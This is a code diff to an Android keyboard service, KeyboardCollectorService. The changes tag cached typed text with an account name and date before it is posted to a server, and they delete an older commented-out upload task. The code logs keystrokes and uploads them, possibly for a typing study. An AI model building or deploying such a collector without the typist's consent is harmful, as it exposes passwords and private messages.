@@ -1,5 +1,7 @@
 package hr.fer.collectors;
 
+import android.app.Service;
+import android.content.Intent;
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.KeyboardView;
 import android.os.Handler;
@@ -34,8 +36,8 @@ public class KeyboardCollectorService extends  InputMethodService
     private Date datetime = new Date();
     private boolean caps = false;
 
-    private int id = 0;
     private StringBuilder typedText;
+    private String account;
 
     private Handler handler = new Handler();
     private Timer timer = null;
@@ -47,6 +49,12 @@ public class KeyboardCollectorService extends  InputMethodService
         kv.setKeyboard(keyboard);
         kv.setOnKeyboardActionListener(this);
         return kv;
+    }
+
+    @Override
+    public int onStartCommand (Intent intent, int flags, int startId) {
+        account = (String) intent.getExtras().get("Account");
+        return Service.START_NOT_STICKY;
     }
 
     @Override
@@ -184,9 +192,9 @@ public class KeyboardCollectorService extends  InputMethodService
         if(contents.length() == 0) return null;
 
         HashMap<String, String> postDataParams = new HashMap<>();
-        postDataParams.put("id", String.valueOf(++id));
+        postDataParams.put("account", account);
         postDataParams.put("text", contents);
-        postDataParams.put("datetime", datetime.toString());
+        postDataParams.put("date", datetime.toString());
         return postDataParams;
     }
 
@@ -209,42 +217,6 @@ public class KeyboardCollectorService extends  InputMethodService
         }
     }
 
-
-
-    /*
-    private class PostDataTOServer extends AsyncTask<Void, Void, Void> {
-        private String contents = ";";
-
-        HashMap<String, String> postDataParams;
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
-
-        }
-        @Override
-        protected Void doInBackground(Void... arg0) {
-            String response;
-            String contents = "";
-            try {
-                contents = readFromCache();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-
-            if(contents.length() == 0) return null;
-
-            postDataParams = new HashMap<>();
-            postDataParams.put("id", String.valueOf(++id));
-            postDataParams.put("text", contents);
-            postDataParams.put("datetime", datetime.toString());
-            response = service.ServerData(SERVER_PATH,postDataParams);
-            return null;
-        }
-
-
-    }
-
-*/
 
 
 }
